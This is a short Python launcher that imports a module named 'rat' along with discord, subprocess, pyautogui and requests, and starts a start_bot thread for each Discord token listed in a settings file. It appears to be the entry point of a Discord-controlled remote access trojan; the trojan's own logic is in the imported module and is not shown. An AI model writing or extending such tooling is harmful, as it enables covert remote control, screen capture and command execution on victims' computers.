from setting import *
from rat import *
import threading
import os, discord, subprocess, requests, pyautogui, re, shutil, json, sys
lines = token.split("\n")
for line in lines:
    threading.Thread(target=start_bot, args=(line,)).start()